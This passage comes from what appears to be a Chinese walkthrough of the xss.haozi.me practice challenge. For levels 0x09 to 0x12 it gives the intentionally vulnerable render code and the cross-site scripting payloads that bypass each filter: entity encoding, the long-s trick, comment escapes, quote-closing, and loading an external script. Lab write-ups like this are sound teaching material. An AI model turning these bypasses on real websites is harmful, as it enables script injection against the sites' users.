+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  let domainRe = /^https?:\/\/www\.segmentfault\.com/<br>  <span class="hljs-keyword">if</span> (domainRe.<span class="hljs-title function_ invoke__">test</span>(input)) &#123;<br>    <span class="hljs-keyword">return</span> `&lt;script src=<span class="hljs-string">&quot;$&#123;input&#125;&quot;</span>&gt;&lt;/script&gt;`<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid URL&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>插入代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">https://www.segmentfault.com&quot;&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(1) </span></span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>网页代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://www.segmentfault.com&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(1) &quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>URL</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=https%3A%2F%2Fwww.segmentfault.com%22%3E%3C%2Fscript%3E%20%3Cimg%20src%3D%23%20onerror%3D%22alert(1)%20<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h2><ul>
+<li>server 源码</li>
+</ul>
+<p>将 &amp; ‘ “ &lt; &gt; &#x2F; 符号转为实体编码，在URL中会解析@后面的网址，如果没弹出来试试换个浏览器，低版本火狐可以弹出</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escapeHtml</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> s.<span class="hljs-title function_ invoke__">replace</span>(/&amp;/g, <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>)<br>            .<span class="hljs-title function_ invoke__">replace</span>(/<span class="hljs-string">&#x27;/g, &#x27;</span>&amp;#<span class="hljs-number">39</span>;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&quot;/g, &#x27;</span>&amp;quot;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&lt;/g, &#x27;</span>&amp;lt;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&gt;/g, &#x27;</span>&amp;gt;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\//g, &#x27;</span>&amp;#x2f<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">  const domainRe = /^https?:\/\/www\.segmentfault\.com/</span><br><span class="hljs-string">  if (domainRe.test(input)) &#123;</span><br><span class="hljs-string">    return `&lt;script src=&quot;$&#123;escapeHtml(input)&#125;&quot;&gt;&lt;/script&gt;`</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">  return &#x27;</span>Invalid URL<span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>插入代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">[<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>](https://www.segmentfault.com@xss.haozi.me/j.js)<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>网页代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https:&amp;#x2f&amp;#x2fwww.segmentfault.com@xss.haozi.me&amp;#x2fj.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>URL</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=https%3A%2F%2Fwww.segmentfault.com%40xss.haozi.me%2Fj.js<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h2><ul>
+<li>server 源码</li>
+</ul>
+<p>输入内容大写，HTML对大小写不敏感，但是JavaScript对大小写敏感，则ALERT()无法执行，需要想办法绕过对JavaScript的的大写转换：</p>
+<ol>
+<li>html编码绕过</li>
+<li>外部js文件绕过</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.<span class="hljs-title function_ invoke__">toUpperCase</span>()<br>  <span class="hljs-keyword">return</span> `&lt;h1&gt;$&#123;input&#125;&lt;/h1&gt;`<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>插入代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;(1)</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>网页代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">SRC</span>=<span class="hljs-string">X</span> <span class="hljs-attr">ONERROR</span>=<span class="hljs-string">&amp;#X61;&amp;#X6C;&amp;#X65;&amp;#X72;&amp;#X74;(1)</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>URL</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3Cimg%20src%3Dx%20onerror%3D%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B(1)%3E%0A<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h2><ul>
+<li>server 源码</li>
+</ul>
+<p>上题基础增加 script 过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(/script/ig, <span class="hljs-string">&#x27;&#x27;</span>)<br>  input = input.<span class="hljs-title function_ invoke__">toUpperCase</span>()<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/h1&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>插入代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;(1)</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>网页代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">SRC</span>=<span class="hljs-string">X</span> <span class="hljs-attr">ONERROR</span>=<span class="hljs-string">&amp;#X61;&amp;#X6C;&amp;#X65;&amp;#X72;&amp;#X74;(1)</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>URL</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3Cimg%20src%3Dx%20onerror%3D%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B(1)%3E%20%0A<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h2><ul>
+<li>server 源码</li>
+</ul>
+<p>输入内容带入到了注释中，可以用换行逃逸。由于过滤了单引号’，所以后面的’)可以用–&gt;注释掉。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(/[&lt;/<span class="hljs-string">&quot;&#x27;]/g, &#x27;&#x27;)</span><br><span class="hljs-string">  return `</span><br><span class="hljs-string">    &lt;script&gt;</span><br><span class="hljs-string">          // alert(&#x27;$&#123;input&#125;&#x27;)</span><br><span class="hljs-string">    &lt;/script&gt;</span><br><span class="hljs-string">  `</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>插入代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">&#x27;) <br>alert(1)<br>--&gt;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>网页代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br>          // alert(&#x27;) <br>alert(1)<br>--&gt;&#x27;)<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>URL</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=&#x27;)%20%0Aalert(1)%0A--%3E<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h2><ul>
+<li>server 源码</li>
+</ul>
+<p>标签里的第一个字母前加上下划线_，并且大写输入所有字母，ſ是古英语中的s的写法, 转成大写是正常的S</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(/&lt;([a-zA-Z])/g, <span class="hljs-string">&#x27;&lt;_$1&#x27;</span>)<br>  input = input.<span class="hljs-title function_ invoke__">toUpperCase</span>()<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/h1&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>插入代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;ſcript <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://xss.haozi.me/j.js&quot;</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>网页代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">SCRIPT</span> <span class="hljs-attr">SRC</span>=<span class="hljs-string">&quot;HTTPS://XSS.HAOZI.ME/J.JS&quot;</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">SCRIPT</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>URL</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3C%C5%BFcript%20src%3D%22https%3A%2F%2Fxss.haozi.me%2Fj.js%22%20%3E%3C%2Fscript%3E<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h2><ul>
+<li><p>server 源码</p>
+</li>
+<li><p>闭合绕过</p>
+</li>
+<li><p>注释后面内容</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escapeHtml</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> s.<span class="hljs-title function_ invoke__">replace</span>(/&amp;/g, <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>)<br>            .<span class="hljs-title function_ invoke__">replace</span>(/<span class="hljs-string">&#x27;/g, &#x27;</span>&amp;#<span class="hljs-number">39</span>;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&quot;/g, &#x27;</span>&amp;quot;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&lt;/g, &#x27;</span>&amp;lt;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&gt;/g, &#x27;</span>&amp;gt;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\//g, &#x27;</span>&amp;#x2f;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">  return `&lt;img src onerror=&quot;console.error(&#x27;</span>$&#123;<span class="hljs-title function_ invoke__">escapeHtml</span>(input)&#125;<span class="hljs-string">&#x27;)&quot;&gt;`</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>插入代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&#x27;);alert(&#x27;1<br>&#x27;);alert(1)//<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>网页代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;console.error(&#x27;<span class="hljs-symbol">&amp;#39;</span>);alert(<span class="hljs-symbol">&amp;#39;</span>1&#x27;)&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;console.error(&#x27;<span class="hljs-symbol">&amp;#39;</span>);alert(1)<span class="hljs-symbol">&amp;#x2f;</span><span class="hljs-symbol">&amp;#x2f;</span>&#x27;)&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>URL</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=&#x27;)%3Balert(&#x27;1<br>http://xss.test/?input=&#x27;)%3Balert(1)%2F%2F<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2><ul>
+<li><p>server 源码</p>
+</li>
+<li><p>闭合标签</p>
+</li>
+<li><p>堆叠注入</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> `<br>&lt;script&gt;<br>  window.data = $&#123;input&#125;<br>&lt;/script&gt;<br>  `<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>插入代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>``<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<br>1;alert(1);<br><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>网页代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-variable language_">window</span>.<span class="hljs-property">data</span> = </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>`<br>`<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-variable language_">window</span>.<span class="hljs-property">data</span> = <span class="hljs-number">1</span>;<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>URL</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3C%2Fscript%3E%60%0A%60%3Cscript%3Ealert(1)<br><br>http://xss.test/?input=1%3Balert(1)%3B<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h2><ul>
+<li>server 源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// from alf.nu</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">s</span>) </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escapeJs</span> (<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">String</span>(s)<br>            .<span class="hljs-title function_ invoke__">replace</span>(/\\/g, <span class="hljs-string">&#x27;\\\\&#x27;</span>)<br>            .<span class="hljs-title function_ invoke__">replace</span>(/<span class="hljs-string">&#x27;/g, &#x27;</span>\\\<span class="hljs-string">&#x27;&#x27;</span>)<br>            .<span class="hljs-title function_ invoke__">replace</span>(/<span class="hljs-string">&quot;/g, &#x27;\\&quot;</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/`/g, &#x27;</span>\\`<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&lt;/g, &#x27;</span>\\<span class="hljs-number">74</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&gt;/g, &#x27;</span>\\<span class="hljs-number">76</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\//g, &#x27;</span>\\/<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\n/g, &#x27;</span>\\n<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\r/g, &#x27;</span>\\r<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\t/g, &#x27;</span>\\t<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\f/g, &#x27;</span>\\f<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\v/g, &#x27;</span>\\v<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            // .replace(/\b/g, &#x27;</span>\\b<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\0/g, &#x27;</span>\\<span class="hljs-number">0</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">  s = escapeJs(s)</span><br><span class="hljs-string">  return `</span><br><span class="hljs-string">&lt;script&gt;</span><br><span class="hljs-string">  var url = &#x27;</span><span class="hljs-attr">javascript</span>:console.<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;$&#123;s&#125;&quot;</span>)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">  var a = document.createElement(&#x27;</span>a<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">  a.href = url</span><br><span class="hljs-string">  document.body.appendChild(a)</span><br><span class="hljs-string">  a.click()</span><br><span class="hljs-string">&lt;/script&gt;</span><br><span class="hljs-string">`</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>插入代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;);alert(1);(&quot;<br>&quot;);alert(1);//<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>网页代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">var</span> url = <span class="hljs-string">&#x27;javascript:console.log(&quot;\&quot;);alert(1);(\&quot;&quot;)&#x27;</span></span><br><span class="language-javascript">  <span class="hljs-keyword">var</span> a = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;a&#x27;</span>)</span><br><span class="language-javascript">  a.<span class="hljs-property">href</span> = url</span><br><span class="language-javascript">  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(a)</span><br><span class="language-javascript">  a.<span class="hljs-title function_">click</span>()</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">var</span> url = <span class="hljs-string">&#x27;javascript:console.log(&quot;\&quot;);alert(1);\/\/&quot;)&#x27;</span></span><br><span class="language-javascript">  <span class="hljs-keyword">var</span> a = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;a&#x27;</span>)</span><br><span class="language-javascript">  a.<span class="hljs-property">href</span> = url</span><br><span class="language-javascript">  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(a)</span><br><span class="language-javascript">  a.<span class="hljs-title function_">click</span>()</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>URL</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%22)%3Balert(1)%3B(%22<br><br>http://xss.test/?input=%22)%3Balert(1)%3B%2F%2F<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h2><ul>
+<li>server 源码</li>
+</ul>
+<p>“被替换成了\，用\进行转义</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// from alf.nu</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span> (<span class="hljs-params">s</span>) </span>&#123;<br>  s = s.<span class="hljs-title function_ invoke__">replace</span>(/<span class="hljs-string">&quot;/g, &#x27;\\&quot;</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">  return &#x27;</span>&lt;script&gt;console.<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;&#x27; + s + &#x27;&quot;</span>);&lt;/script&gt;<span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>插入代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">\&quot;);alert(1)//<br></code></pre></td></tr></table></figure>
+
+<ul>
